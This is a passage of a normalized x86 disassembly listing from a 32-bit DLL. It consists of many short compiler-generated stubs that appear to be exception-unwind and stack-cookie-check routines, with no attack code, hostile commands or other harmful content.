call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049a04
lea ecx [ ebp - 0x38 ]
jmp sub_10001da0
sub_10049a0c
push [ ebp - 0x1c ]
call sub_1002004f
pop ecx
retn
sub_10049a16
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov eax [ ebp + 0x8 ]
jmp sub_1001005d
sub_10049a2f
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_10049a37
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049a52
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10049a5a
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10049a62
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049a7d
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_10049a85
lea ecx [ ebp - 0x44 ]
jmp sub_10001da0
sub_10049a8d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049aa8
lea ecx [ ebp - 0x38 ]
jmp sub_10001da0
sub_10049ab0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049acb
lea ecx [ ebp - 0x244 ]
jmp sub_10001da0
sub_10049ad6
lea ecx [ ebp - 0x260 ]
jmp sub_10001da0
sub_10049ae1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049b09
lea ecx [ ebp - 0x90 ]
jmp sub_10001da0
sub_10049b14
lea ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_10049b1c
lea ecx [ ebp - 0x90 ]
jmp sub_10001da0
sub_10049b27
lea ecx [ ebp - 0x74 ]
jmp sub_10001da0
sub_10049b2f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x9c ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_10020040
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049b5d
lea ecx [ ebp - 0x44 ]
jmp sub_10001da0
sub_10049b65
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_10049b6d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049b88
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_10049b90
lea ecx [ ebp - 0x44 ]
jmp sub_10001da0
sub_10049b98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049bb3
lea ecx [ ebp - 0x23c ]
jmp sub_10001da0
sub_10049bbe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x240 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049be6
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10049bee
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10049bf6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049c11
lea ecx [ ebp - 0x28 ]
jmp sub_100025e2
sub_10049c19
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049c34
push [ ebp - 0x18 ]
call sub_1002004f
pop ecx
retn
sub_10049c3e
lea eax [ ebp - 0x20 ]
jmp sub_1001005d
sub_10049c46
lea esi [ ebp - 0x48 ]
jmp sub_10011bce
sub_10049c4e
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov esi [ ebp + 0x8 ]
jmp sub_10011bce
sub_10049c67
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049c82
mov eax [ ebp - 0x30 ]
jmp sub_1001005d
sub_10049c8a
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10049c92
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049cad
lea ecx [ ebp - 0x70 ]
jmp sub_10001da0
sub_10049cb5
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_10049cbd
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049cd8
lea ecx [ ebp - 0x54 ]
jmp sub_100025e2
sub_10049ce0
lea ecx [ ebp - 0x70 ]
jmp sub_100025e2
sub_10049ce8
lea ecx [ ebp - 0x1c ]
jmp sub_10011795
sub_10049cf0
lea ecx [ ebp - 0x38 ]
jmp sub_100025e2
sub_10049cf8
lea esi [ ebp - 0x98 ]
jmp sub_10011bce
sub_10049d03
lea ecx [ ebp - 0x38 ]
jmp sub_100025e2
sub_10049d0b
lea esi [ ebp - 0x98 ]
jmp sub_10011bce
sub_10049d16
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049d34
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049d4f
push [ ebp - 0x10 ]
call sub_1002004f
pop ecx
retn
sub_10049d59
lea eax [ ebp - 0x1c ]
jmp sub_1001005d
sub_10049d61
lea ecx [ ebp - 0x38 ]
jmp sub_10001da0
sub_10049d69
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_10049d71
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049d8c
mov ecx [ ebp - 0x10 ]
jmp sub_100132a0
sub_10049d94
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_100025e2
sub_10049d9f
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_100025e2
sub_10049daa
mov eax [ ebp - 0x10 ]
add eax 0x54
jmp sub_1001005d
sub_10049db5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049dd0
lea ecx [ ebp - 0x5c ]
jmp sub_10001da0
sub_10049dd8
lea ecx [ ebp - 0x5c ]
jmp sub_10001da0
sub_10049de0
lea ecx [ ebp - 0x5c ]
jmp sub_10001da0
sub_10049de8
lea ecx [ ebp - 0x5c ]
jmp sub_10001da0
sub_10049df0
lea ecx [ ebp - 0x18 ]
jmp sub_10011e55
sub_10049df8
lea ecx [ ebp - 0x40 ]
jmp sub_10001da0
sub_10049e00
lea ecx [ ebp - 0x24 ]
jmp sub_100132a0
sub_10049e08
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049e26
lea ecx [ ebp + 0xc ]
jmp sub_100025e2
sub_10049e2e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049e49
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_100025e2
sub_10049e62
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049e7d
mov ecx [ ebp + 0x8 ]
jmp sub_1000eef5
sub_10049e85
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10001da0
sub_10049e90
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_100025e2
sub_10049e9b
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_100025e2
sub_10049ea6
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_100025e2
sub_10049eb1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049ecc
lea ecx [ ebp + 0x8 ]
jmp sub_10007b41
sub_10049ed4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049eef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049f0a
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_1000d98a
sub_10049f15
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049f30
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10007c26
sub_10049f4c
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_1000c490
sub_10049f57
mov ecx [ ebp - 0x14 ]
jmp sub_1000d8e6
sub_10049f5f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049f7a
lea ecx [ ebp - 0x30 ]
jmp sub_10013a3f
sub_10049f82
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10049f8a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049faf
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10049fb7
lea eax [ ebp - 0x70 ]
jmp sub_1001005d
sub_10049fbf
lea ecx [ ebp - 0x68 ]
jmp sub_10001da0
sub_10049fc7
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10049fcf
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x74 ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_10020040
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10049ff7
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10049fff
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_1004a007
lea ecx [ ebp - 0x68 ]
jmp sub_10001da0
sub_1004a00f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x74 ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a037
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_1004a03f
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004a047
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a06c
lea eax [ ebp + 0x8 ]
jmp sub_1001005d
sub_1004a074
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_1004a07c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a097
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_1004a09f
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_1004a0a7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a0c2
lea ecx [ ebp + 0xc ]
jmp sub_10007b41
sub_1004a0ca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a0e5
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_10007319
sub_1004a0f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a10b
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10007c26
sub_1004a127
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_1000307b
sub_1004a132
mov ecx [ ebp - 0x14 ]
jmp sub_10007284
sub_1004a13a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a155
mov ecx [ ebp + 0x8 ]
jmp sub_100132a0
sub_1004a15d
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_1004a165
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a180
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_1004a188
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a1a3
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004a1ab
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_1004a1b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a1ce
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004a1d6
lea ecx [ ebp - 0x48 ]
call sub_10001da0
retn
sub_1004a1df
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a1fa
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov eax [ ebp + 0xc ]
jmp sub_1001005d
sub_1004a213
lea eax [ ebp - 0x18 ]
jmp sub_1001005d
sub_1004a21b
lea eax [ ebp - 0x18 ]
jmp sub_1001005d
sub_1004a223
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a23e
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_100025e2
sub_1004a249
mov eax [ ebp + 0x8 ]
add eax 0x3c
jmp sub_1001005d
sub_1004a254
lea eax [ ebp - 0x18 ]
jmp sub_1001005d
sub_1004a25c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a277
push [ ebp - 0x10 ]
call sub_1002004f
pop ecx
retn
sub_1004a281
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a29c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a2b7
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10007c26
sub_1004a2d3
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000d945
sub_1004a2de
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000e061
sub_1004a2e9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a304
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_10007c26
sub_1004a320
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_1000d98a
sub_1004a32b
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_1000e061
sub_1004a336
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a351
lea ecx [ ebp - 0x2d4 ]
jmp sub_100025e2
sub_1004a35c
lea ecx [ ebp - 0x4c ]
jmp sub_100025e2
sub_1004a364
lea ecx [ ebp - 0x2f0 ]
jmp sub_100025e2
sub_1004a36f
lea ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_1004a377
mov eax [ ebp - 0x2a0 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2a0 ] 0xfffffffe
mov eax [ ebp - 0x2b4 ]
jmp sub_1001005d
sub_1004a399
push [ ebp - 0x2ac ]
call sub_1002004f
pop ecx
retn
sub_1004a3a6
mov eax [ ebp - 0x2a0 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x2a0 ] 0xfffffffd
lea ecx [ ebp - 0x2d4 ]
jmp sub_100025e2
sub_1004a3c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2f4 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a3f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a40b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a426
mov ecx [ ebp - 0x10 ]
jmp sub_100025e2
sub_1004a42e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a449
lea ecx [ ebp - 0x78 ]
jmp sub_100025e2
sub_1004a451
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_1004a459
lea ecx [ ebp - 0x94 ]
jmp sub_100025e2
sub_1004a464
mov eax [ ebp - 0x5c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x5c ] 0xfffffffe
mov ecx [ ebp - 0x50 ]
jmp sub_100025e2
sub_1004a47d
lea ecx [ ebp - 0x4c ]
jmp sub_100104f6
sub_1004a485
lea ecx [ ebp - 0x78 ]
jmp sub_10001da0
sub_1004a48d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a4b5
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_1004a4bd
push [ ebp - 0x58 ]
call sub_1002004f
pop ecx
retn
sub_1004a4c7
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a4e2
lea ecx [ ebp - 0x248 ]
jmp sub_100132a0
sub_1004a4ed
lea ecx [ ebp - 0x274 ]
jmp sub_100025e2
sub_1004a4f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x278 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a520
mov ecx [ ebp + 0x8 ]
jmp sub_100132a0
sub_1004a528
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_100025e2
sub_1004a533
mov edi [ ebp + 0x8 ]
add edi 0x34
jmp sub_10002634
sub_1004a53e
mov ecx [ ebp + 0x8 ]
add ecx 0xbc
jmp sub_100025e2
sub_1004a54c
lea ecx [ ebp - 0x28 ]
jmp sub_100025e2
sub_1004a554
mov ecx [ ebp + 0x8 ]
add ecx 0xd8
jmp sub_1000add8
sub_1004a562
mov ecx [ ebp + 0x10 ]
jmp sub_100132a0
sub_1004a56a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a585
lea ecx [ ebp - 0x14 ]
jmp sub_10007b41
sub_1004a58d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a5a8
lea edi [ ebp - 0xa0 ]
jmp sub_10002634
sub_1004a5b3
push [ ebp - 0xc0 ]
call sub_1002004f
pop ecx
retn
sub_1004a5c0
mov eax [ ebp - 0xc4 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xc4 ] 0xfffffffe
lea ecx [ ebp - 0xbc ]
jmp sub_100025e2
sub_1004a5e2
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc4 ]
mov ecx [ edx - 0xc8 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a610
lea ecx [ ebp - 0x858 ]
jmp sub_10001da0
sub_1004a61b
lea ecx [ ebp - 0x83c ]
jmp sub_1001ae00
sub_1004a626
lea ecx [ ebp - 0x858 ]
jmp sub_10001da0
sub_1004a631
mov eax [ ebp - 0x81c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x81c ] 0xfffffffe
mov esi [ ebp - 0x820 ]
jmp sub_1001111d
sub_1004a653
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x884 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a67b
lea ecx [ ebp - 0x78 ]
jmp sub_10001da0
sub_1004a683
lea esi [ ebp - 0x50 ]
jmp sub_1001111d
sub_1004a68b
lea esi [ ebp - 0xb0 ]
jmp sub_1001111d
sub_1004a696
lea ecx [ ebp - 0x78 ]
jmp sub_10001da0
sub_1004a69e
lea esi [ ebp - 0xb0 ]
jmp sub_1001111d
sub_1004a6a9
lea ecx [ ebp - 0x94 ]
jmp sub_10001da0
sub_1004a6b4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a6dc
lea ecx [ ebp - 0x18 ]
jmp sub_10011e55
sub_1004a6e4
lea ecx [ ebp - 0x3c ]
jmp sub_100025e2
sub_1004a6ec
lea eax [ ebp - 0x20 ]
jmp sub_1001005d
sub_1004a6f4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a70f
lea eax [ ebp - 0x28 ]
push eax
call sub_10007c4c
retn
sub_1004a719
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a734
lea eax [ ebp - 0x1c ]
jmp sub_10007c34
sub_1004a73c
lea eax [ ebp - 0x1c ]
jmp sub_10007c34
sub_1004a744
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a75f
lea eax [ ebp - 0x58 ]
jmp sub_1001005d
sub_1004a767
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_1004a76f
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_1004a777
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a79f
lea eax [ ebp - 0x34 ]
jmp sub_1001005d
sub_1004a7a7
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004a7af
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a7ca
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_1004a7d2
lea ecx [ ebp - 0x38 ]
jmp sub_10001cc8
sub_1004a7da
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a7f5
mov eax [ ebp + 0x8 ]
jmp sub_10007c34
sub_1004a7fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a818
mov eax [ ebp + 0x8 ]
jmp sub_10007c34
sub_1004a820
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a83b
lea eax [ ebp - 0x30 ]
jmp sub_10007c34
sub_1004a843
lea ecx [ ebp - 0x24 ]
jmp sub_10007b41
sub_1004a84b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a866
lea eax [ ebp - 0x24 ]
push eax
call sub_10007c4c
retn
sub_1004a870
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a88b
lea eax [ ebp - 0x20 ]
jmp sub_10007c34
sub_1004a893
lea ecx [ ebp - 0x18 ]
jmp sub_10007b41
sub_1004a89b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a8b6
lea eax [ ebp - 0x28 ]
jmp sub_10007c34
sub_1004a8be
lea ecx [ ebp - 0x20 ]
jmp sub_10007b41
sub_1004a8c6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a8e1
lea eax [ ebp - 0x110 ]
jmp sub_10002709
sub_1004a8ec
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_1004a8f4
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_1004a8fc
lea ecx [ ebp - 0x74 ]
jmp sub_10001da0
sub_1004a904
lea ecx [ ebp - 0x74 ]
jmp sub_10001da0
sub_1004a90c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x114 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004a934
lea ecx [ ebp - 0x68 ]
jmp sub_100025e2
sub_1004a93c
lea ecx [ ebp - 0x84 ]
jmp sub_100025e2
sub_1004a947
lea ecx [ ebp - 0x4c ]
